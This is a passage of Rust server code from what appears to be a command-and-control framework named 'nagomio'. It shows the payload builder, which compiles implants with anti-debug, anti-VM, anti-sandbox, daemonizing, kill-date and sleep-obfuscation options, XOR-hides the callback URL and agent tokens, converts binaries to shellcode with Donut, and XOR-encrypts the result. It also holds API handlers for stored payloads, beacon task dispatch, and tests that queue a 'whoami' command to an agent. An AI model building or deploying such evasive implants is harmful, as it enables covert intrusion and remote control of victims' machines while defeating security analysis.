    tokio::fs::create_dir_all(&artifact_dir)
        .await
        .map_err(internal_error)?;

    let agent_dir = config.project_root.join("agent");
    let build_dir = artifact_dir.join("build");
    let embedded_agent_id = payload
        .agent_id
        .as_deref()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or("");
    let embedded_agent_token = payload
        .agent_token
        .as_deref()
        .filter(|value| !value.trim().is_empty())
        .or(config.agent_token.as_deref())
        .unwrap_or("");
    let stealth_flag = payload.stealth.unwrap_or(false);
    let target_os = payload.target_os.unwrap_or_else(|| "linux".to_string());
    let anti_debug = payload.anti_debug.unwrap_or(stealth_flag);
    let anti_vm = payload.anti_vm.unwrap_or(stealth_flag);
    let anti_sandbox = payload.anti_sandbox.unwrap_or(stealth_flag);
    let daemonize = payload.daemonize.unwrap_or(stealth_flag);
    let static_runtime = payload.static_runtime.unwrap_or(target_os == "windows");
    let xor_config = payload.xor_config.unwrap_or(false);
    let xor_key = payload.xor_key.unwrap_or(90).clamp(1, 255);
    let kill_date_epoch = payload.kill_date_epoch.unwrap_or(0);
    let ua_randomize = payload.ua_randomize.unwrap_or(false);
    let sleep_obfuscate = payload.sleep_obfuscate.unwrap_or(false);
    let encrypt_payload = payload.encrypt_payload.unwrap_or(false);
    let callback_url_xor = xor_c_array(&callback_url, xor_key as u8);
    let agent_id_xor = xor_c_array(embedded_agent_id, xor_key as u8);
    let agent_token_xor = xor_c_array(embedded_agent_token, xor_key as u8);
    let plain_callback_url = if xor_config {
        ""
    } else {
        callback_url.as_str()
    };
    let plain_agent_id = if xor_config { "" } else { embedded_agent_id };
    let plain_agent_token = if xor_config { "" } else { embedded_agent_token };

    let mut cmake_config_cmd = Command::new("cmake");
    cmake_config_cmd
        .arg("-S")
        .arg(&agent_dir)
        .arg("-B")
        .arg(&build_dir);

    let format = payload
        .format
        .clone()
        .unwrap_or_else(|| "executable".to_string());
    if format == "shellcode" {
        cmake_config_cmd.arg("-DNAGOMIO_BUILD_SHARED=ON");
    }

    if target_os == "windows" {
        cmake_config_cmd
            .arg("-DCMAKE_SYSTEM_NAME=Windows")
            .arg("-DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc")
            .arg("-DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++");
    }

    run_command(
        cmake_config_cmd
            .arg(format!(
                "-DNAGOMIO_DEFAULT_CALLBACK_URL={}",
                plain_callback_url
            ))
            .arg(format!("-DNAGOMIO_DEFAULT_SLEEP_SECONDS={}", sleep_seconds))
            .arg(format!(
                "-DNAGOMIO_DEFAULT_JITTER_PERCENT={}",
                jitter_percent
            ))
            .arg(format!("-DNAGOMIO_DEFAULT_AGENT_ID={}", plain_agent_id))
            .arg(format!(
                "-DNAGOMIO_DEFAULT_AGENT_TOKEN={}",
                plain_agent_token
            ))
            .arg(format!(
                "-DNAGOMIO_STEALTH={}",
                if stealth_flag { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_ANTI_DEBUG={}",
                if anti_debug { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_ANTI_VM={}",
                if anti_vm { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_ANTI_SANDBOX={}",
                if anti_sandbox { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_DAEMONIZE={}",
                if daemonize { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_STATIC_RUNTIME={}",
                if static_runtime { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_CALLBACK_USES_HTTPS={}",
                if callback_uses_https { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_XOR_CONFIG={}",
                if xor_config { "ON" } else { "OFF" }
            ))
            .arg(format!("-DNAGOMIO_XOR_KEY={}", xor_key))
            .arg(format!("-DNAGOMIO_CALLBACK_URL_XOR={}", callback_url_xor))
            .arg(format!(
                "-DNAGOMIO_CALLBACK_URL_XOR_LEN={}",
                callback_url.len()
            ))
            .arg(format!("-DNAGOMIO_AGENT_ID_XOR={}", agent_id_xor))
            .arg(format!(
                "-DNAGOMIO_AGENT_ID_XOR_LEN={}",
                embedded_agent_id.len()
            ))
            .arg(format!("-DNAGOMIO_AGENT_TOKEN_XOR={}", agent_token_xor))
            .arg(format!(
                "-DNAGOMIO_AGENT_TOKEN_XOR_LEN={}",
                embedded_agent_token.len()
            ))
            .arg(format!(
                "-DNAGOMIO_KILL_DATE_EPOCH={}",
                kill_date_epoch
            ))
            .arg(format!(
                "-DNAGOMIO_UA_RANDOMIZE={}",
                if ua_randomize { "ON" } else { "OFF" }
            ))
            .arg(format!(
                "-DNAGOMIO_SLEEP_OBFUSCATE={}",
                if sleep_obfuscate { "ON" } else { "OFF" }
            )),
    )
    .await?;
    run_command(Command::new("cmake").arg("--build").arg(&build_dir)).await?;

    let binary_name = if target_os == "windows" {
        if format == "shellcode" {
            "nagomio-agent.dll"
        } else {
            "nagomio-agent.exe"
        }
    } else {
        if format == "shellcode" {
            "libnagomio-agent.so"
        } else {
            "nagomio-agent"
        }
    };

    let built_binary = build_dir.join(binary_name);
    let mut artifact_binary = artifact_dir.join(binary_name);
    let mut run_args = vec![artifact_binary.display().to_string()];

    if format == "shellcode" {
        let shellcode_binary = artifact_dir.join("nagomio-agent.bin");

        // Use Donut for production-grade PE/ELF to PIC shellcode conversion.
        let donut_check = Command::new("donut").arg("-h").output().await;
        if donut_check.is_ok() {
            let donut_res = run_command(
                Command::new("donut")
                    .arg("-a")
                    .arg("2") // x64
                    .arg("-i")
                    .arg(&built_binary)
                    .arg("-o")
                    .arg(&shellcode_binary),
            )
            .await;

            if donut_res.is_err() {
                return Err((
                    StatusCode::INTERNAL_SERVER_ERROR,
                    "Donut failed to generate shellcode.".into(),
                ));
            }
        } else {
            return Err((StatusCode::INTERNAL_SERVER_ERROR, "Production Shellcode Error: 'donut' is not installed in the server's PATH. Please install https://github.com/TheWover/donut to convert payloads into position-independent code.".into()));
        }

        artifact_binary = shellcode_binary.clone();
        run_args = vec![
            "<shellcode_loader>".to_string(),
            artifact_binary.display().to_string(),
        ];
    } else {
        tokio::fs::copy(&built_binary, &artifact_binary)
            .await
            .map_err(internal_error)?;
    }

    if encrypt_payload {
        let encrypted_path = artifact_binary.with_extension(
            artifact_binary
                .extension()
                .map(|ext| format!("{}.enc", ext.to_string_lossy()))
                .unwrap_or_else(|| "enc".to_string()),
        );
        let plain_bytes = tokio::fs::read(&artifact_binary)
            .await
            .map_err(internal_error)?;
        let xor_key_u8 = xor_key as u8;
        let encrypted: Vec<u8> = plain_bytes
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ xor_key_u8 ^ (i as u8))
            .collect();
        tokio::fs::write(&encrypted_path, &encrypted)
            .await
            .map_err(internal_error)?;
        tokio::fs::remove_file(&artifact_binary)
            .await
            .map_err(internal_error)?;
        artifact_binary = encrypted_path;
    }

    let artifact = PayloadArtifact {
        build_id: build_id.clone(),
        label: payload.label.filter(|value| !value.trim().is_empty()),
        binary_path: artifact_binary.display().to_string(),
        callback_url,
        sleep_seconds,
        jitter_percent,
        agent_id: payload.agent_id.filter(|value| !value.trim().is_empty()),
        agent_token_configured: !embedded_agent_token.is_empty(),
        stealth: stealth_flag,
        anti_debug,
        anti_vm,
        anti_sandbox,
        daemonize,
        static_runtime,
        xor_config,
        xor_key,
        target_os,
        format: Some(format),
        run_args,
        created_at_unix,
        kill_date_epoch,
        ua_randomize,
        sleep_obfuscate,
        encrypt_payload,
    };

    let snapshot = {
        let mut state = state.lock().await;
        state.store.payloads.insert(build_id, artifact.clone());
        state.store.clone()
    };
    persist_store(db_path, state_file, snapshot).await;

    let manifest_path = artifact_dir.join("manifest.json");
    let manifest = serde_json::to_vec_pretty(&artifact).map_err(internal_error)?;
    tokio::fs::write(&manifest_path, manifest)
        .await
        .map_err(internal_error)?;

    Ok(Json(artifact))
}

async fn api_get_payload_artifacts(
    State(state): State<SharedState>,
    headers: HeaderMap,
) -> Result<Json<Vec<PayloadArtifact>>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let mut artifacts = state.store.payloads.values().cloned().collect::<Vec<_>>();
    artifacts.sort_by_key(|artifact| Reverse(artifact.created_at_unix));
    Ok(Json(artifacts))
}

async fn api_delete_payload_artifacts(
    State(state): State<SharedState>,
    headers: HeaderMap,
) -> Result<StatusCode, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let (db_path, payload_dir) = {
        let state = state.lock().await;
        (state.db_path.clone(), state.config.payload_dir.clone())
    };

    if payload_dir.file_name().is_none() {
        return Err((
            StatusCode::BAD_REQUEST,
            "payload directory must not be a filesystem root".to_owned(),
        ));
    }

    if let Some(db_path) = db_path {
        let conn = open_db(&db_path).map_err(internal_error)?;
        conn.execute("DELETE FROM payloads", [])
            .map_err(internal_error)?;
    }

    match std::fs::read_dir(&payload_dir) {
        Ok(entries) => {
            for entry in entries {
                let entry = entry.map_err(internal_error)?;
                let path = entry.path();
                let name = path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .unwrap_or("");
                if !name.starts_with("payload-") {
                    continue;
                }

                if path.is_dir() {
                    std::fs::remove_dir_all(&path).map_err(internal_error)?;
                } else {
                    std::fs::remove_file(&path).map_err(internal_error)?;
                }
            }
        }
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
        Err(err) => return Err(internal_error(err)),
    }

    let mut lock = state.lock().await;
    lock.store.payloads.clear();

    Ok(StatusCode::NO_CONTENT)
}

async fn api_get_payload_artifact(
    State(state): State<SharedState>,
    headers: HeaderMap,
    AxumPath(build_id): AxumPath<String>,
) -> Result<Json<PayloadArtifact>, (StatusCode, String)> {
    require_api_auth(&headers, &state).await?;
    let state = state.lock().await;
    let artifact = state
        .store
        .payloads
        .get(&build_id)
        .cloned()
        .ok_or_else(|| {
            (
                StatusCode::NOT_FOUND,
                format!("payload artifact {} not found", build_id),
            )
        })?;
    Ok(Json(artifact))
}

async fn run_command(command: &mut Command) -> Result<(), (StatusCode, String)> {
    let output = command.output().await.map_err(internal_error)?;
    if output.status.success() {
        return Ok(());
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);
    Err((
        StatusCode::INTERNAL_SERVER_ERROR,
        format!(
            "payload build command failed\nstdout:\n{}\nstderr:\n{}",
            stdout, stderr
        ),
    ))
}

fn internal_error<E: std::fmt::Display>(err: E) -> (StatusCode, String) {
    (StatusCode::INTERNAL_SERVER_ERROR, err.to_string())
}

fn unix_now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_secs())
        .unwrap_or_default()
}

fn unix_now_nanos() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_nanos())
        .unwrap_or_default()
}

fn agent_summary(agent: &AgentRecord, now: u64, sleep_seconds: u64) -> AgentSummary {
    let online_after = sleep_seconds.saturating_mul(2).max(1);
    let stale_after = sleep_seconds.saturating_mul(6).max(online_after + 1);
    let age = now.saturating_sub(agent.last_seen_unix);
    let status = if age <= online_after {
        AgentStatus::Online
    } else if age <= stale_after {
        AgentStatus::Stale
    } else {
        AgentStatus::Offline
    };

    AgentSummary {
        registration: agent.registration.clone(),
        first_seen_unix: agent.first_seen_unix,
        last_seen_unix: agent.last_seen_unix,
        status,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use shared::AgentRegistration;

    fn sample_store() -> Store {
        let mut store = Store::default();
        store.agents.insert(
            "agent-1".to_owned(),
            AgentRecord {
                registration: AgentRegistration {
                    agent_id: "agent-1".to_owned(),
                    hostname: "host".to_owned(),
                    os: "linux".to_owned(),
                    architecture: "x86_64".to_owned(),
                },
                first_seen_unix: 1,
                last_seen_unix: 2,
            },
        );
        store.tasks.insert(
            "task-1".to_owned(),
            TaskRecord {
                agent_id: "agent-1".to_owned(),
                task: Task {
                    task_id: "task-1".to_owned(),
                    command: "whoami".to_owned(),
                    arguments: Vec::new(),
                },
                status: TaskStatus::Queued,
                created_at_unix: 3,
                dispatched_at_unix: None,
                completed_at_unix: None,
            },
        );
        store
            .pending_tasks
            .insert("agent-1".to_owned(), VecDeque::from(["task-1".to_owned()]));
        store.responses.insert(
            "agent-1".to_owned(),
            vec![AgentResponse {
                agent_id: "agent-1".to_owned(),
                task_id: Some("task-1".to_owned()),
                output: "operator".to_owned(),
                status: "success".to_owned(),
            }],
        );
        store
    }

    fn sample_task() -> Task {
        Task {
            task_id: "task-1".to_owned(),
            command: "whoami".to_owned(),
            arguments: Vec::new(),
        }
    }

    #[test]
    fn store_round_trips_through_json() {
        let store = sample_store();
        let encoded = serde_json::to_string(&store).expect("store should serialize");
        let decoded: Store = serde_json::from_str(&encoded).expect("store should deserialize");

        assert_eq!(decoded.agents.len(), 1);
        assert_eq!(decoded.agents["agent-1"].last_seen_unix, 2);
        assert_eq!(decoded.tasks["task-1"].task.task_id, "task-1");
        assert_eq!(decoded.pending_tasks["agent-1"][0], "task-1");
        assert_eq!(decoded.responses["agent-1"][0].status, "success");
    }

    #[test]
    fn store_round_trips_through_sqlite() {
        let path =
            std::env::temp_dir().join(format!("nagomio-store-test-{}.db", std::process::id()));
        let _ = std::fs::remove_file(&path);

        let store = sample_store();
        save_store_to_db(&path, &store).expect("store should persist to sqlite");
        let decoded = load_store_from_db(&path).expect("store should load from sqlite");

        assert_eq!(decoded.agents["agent-1"].registration.hostname, "host");
        assert_eq!(decoded.tasks["task-1"].status, TaskStatus::Queued);
        assert_eq!(decoded.pending_tasks["agent-1"][0], "task-1");
        assert_eq!(decoded.responses["agent-1"][0].output, "operator");

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn sqlite_load_accepts_legacy_payload_artifacts_without_target_os() {
        let path = std::env::temp_dir().join(format!(
            "nagomio-legacy-payload-test-{}.db",
            std::process::id()
        ));
        let _ = std::fs::remove_file(&path);

        let conn = open_db(&path).expect("database should open");
        conn.execute(
            "INSERT INTO payloads (build_id, artifact_json) VALUES (?1, ?2)",
            params![
                "payload-legacy",
                r#"{
                    "build_id":"payload-legacy",
                    "label":null,
                    "binary_path":"payloads/payload-legacy/nagomio-agent",
                    "callback_url":"http://127.0.0.1:8080",
                    "sleep_seconds":5,
                    "agent_id":null,
                    "agent_token_configured":false,
                    "stealth":false,
                    "run_args":["payloads/payload-legacy/nagomio-agent"],
                    "created_at_unix":1
                }"#,
            ],
        )
        .expect("legacy payload row should insert");
        drop(conn);

        let decoded = load_store_from_db(&path).expect("legacy payload should load");
        assert_eq!(decoded.payloads["payload-legacy"].target_os, "linux");

        let _ = std::fs::remove_file(path);
    }

    #[tokio::test]
    async fn beacon_dispatches_queued_task_and_marks_it_dispatched() {
        let state = Arc::new(Mutex::new(AppState {
            store: Store::default(),
            config: Config {
                bind_addr: "127.0.0.1:0".to_owned(),
                db_path: None,
                state_file: None,
                project_root: PathBuf::from("."),
                payload_dir: PathBuf::from("payloads"),
                download_dir: PathBuf::from("downloads"),
                callback_url: "http://127.0.0.1:0".to_owned(),
                default_sleep_seconds: 9,
                api_token: None,
                agent_token: None,
                cors_origins: default_cors_origins(),
                allow_unauthenticated: true,
            },
            db_path: None,
            state_file: None,
        }));

        let add_req = AddTaskReq {
            agent_id: "agent-1".to_owned(),
            task: sample_task(),
        };
        let Json(queued_task) = api_add_task(State(state.clone()), HeaderMap::new(), Json(add_req))
            .await
            .expect("task should queue");
        assert_eq!(queued_task.status, TaskStatus::Queued);

        let beacon = BeaconRequest {
            registration: AgentRegistration {
                agent_id: "agent-1".to_owned(),
                hostname: "host".to_owned(),
                os: "linux".to_owned(),
                architecture: "x86_64".to_owned(),
            },
        };

        let Json(reply) = handle_beacon(State(state.clone()), HeaderMap::new(), Json(beacon))
            .await
            .expect("beacon should succeed");

        assert_eq!(reply.sleep_seconds, 9);
        assert_eq!(reply.task.expect("task should dispatch").task_id, "task-1");

        let state = state.lock().await;
        assert_eq!(state.store.tasks["task-1"].status, TaskStatus::Dispatched);
        assert!(state.store.tasks["task-1"].dispatched_at_unix.is_some());
    }

    #[test]
    fn agent_summary_classifies_last_seen_age() {
        let mut store = sample_store();
        let mut agent = store.agents.remove("agent-1").expect("agent exists");

        agent.last_seen_unix = 100;
        assert_eq!(agent_summary(&agent, 108, 5).status, AgentStatus::Online);
        assert_eq!(agent_summary(&agent, 120, 5).status, AgentStatus::Stale);
        assert_eq!(agent_summary(&agent, 140, 5).status, AgentStatus::Offline);
    }

    #[test]
    fn config_uses_defaults_when_env_is_absent() {
        let bind_addr = env::var("NAGOMIO_BIND_ADDR").ok();
        let db_path = env::var_os("NAGOMIO_DB_PATH");
        let state_file = env::var_os("NAGOMIO_STATE_FILE");
        let project_root = env::var_os("NAGOMIO_PROJECT_ROOT");
        let payload_dir = env::var_os("NAGOMIO_PAYLOAD_DIR");
        let download_dir = env::var_os("NAGOMIO_DOWNLOAD_DIR");
        let callback_url = env::var("NAGOMIO_CALLBACK_URL").ok();
        let sleep_seconds = env::var("NAGOMIO_DEFAULT_SLEEP_SECONDS").ok();
        let api_token = env::var("NAGOMIO_API_TOKEN").ok();
        let agent_token = env::var("NAGOMIO_AGENT_TOKEN").ok();
        let allow_unauthenticated = env::var("NAGOMIO_ALLOW_UNAUTHENTICATED").ok();

        env::remove_var("NAGOMIO_BIND_ADDR");
        env::remove_var("NAGOMIO_DB_PATH");
        env::remove_var("NAGOMIO_STATE_FILE");
        env::remove_var("NAGOMIO_PROJECT_ROOT");
        env::remove_var("NAGOMIO_PAYLOAD_DIR");
        env::remove_var("NAGOMIO_DOWNLOAD_DIR");
        env::remove_var("NAGOMIO_CALLBACK_URL");
        env::remove_var("NAGOMIO_DEFAULT_SLEEP_SECONDS");
        env::remove_var("NAGOMIO_API_TOKEN");
        env::remove_var("NAGOMIO_AGENT_TOKEN");
        env::remove_var("NAGOMIO_ALLOW_UNAUTHENTICATED");

        let config = Config::from_env();

        assert_eq!(config.bind_addr, "127.0.0.1:8080");
        assert_eq!(config.db_path, Some(PathBuf::from("nagomio.db")));
        assert!(config.state_file.is_none());
        assert_eq!(config.payload_dir, PathBuf::from("payloads"));
        assert_eq!(config.download_dir, PathBuf::from("downloads"));
        assert_eq!(config.callback_url, "http://127.0.0.1:8080");
        assert_eq!(config.default_sleep_seconds, 5);
        assert!(config.api_token.is_none());
        assert!(config.agent_token.is_none());
        assert!(config.allow_unauthenticated);

        if let Some(value) = bind_addr {
            env::set_var("NAGOMIO_BIND_ADDR", value);
        }
        if let Some(value) = db_path {
            env::set_var("NAGOMIO_DB_PATH", value);
        }
        if let Some(value) = state_file {
            env::set_var("NAGOMIO_STATE_FILE", value);
        }
        if let Some(value) = project_root {
            env::set_var("NAGOMIO_PROJECT_ROOT", value);
        }
        if let Some(value) = payload_dir {
            env::set_var("NAGOMIO_PAYLOAD_DIR", value);
        }
        if let Some(value) = download_dir {
            env::set_var("NAGOMIO_DOWNLOAD_DIR", value);
        }
        if let Some(value) = callback_url {
            env::set_var("NAGOMIO_CALLBACK_URL", value);
        }
        if let Some(value) = sleep_seconds {
            env::set_var("NAGOMIO_DEFAULT_SLEEP_SECONDS", value);
        }
        if let Some(value) = api_token {
            env::set_var("NAGOMIO_API_TOKEN", value);
        }
        if let Some(value) = agent_token {
            env::set_var("NAGOMIO_AGENT_TOKEN", value);
        }
        if let Some(value) = allow_unauthenticated {
            env::set_var("NAGOMIO_ALLOW_UNAUTHENTICATED", value);
        }
    }
}
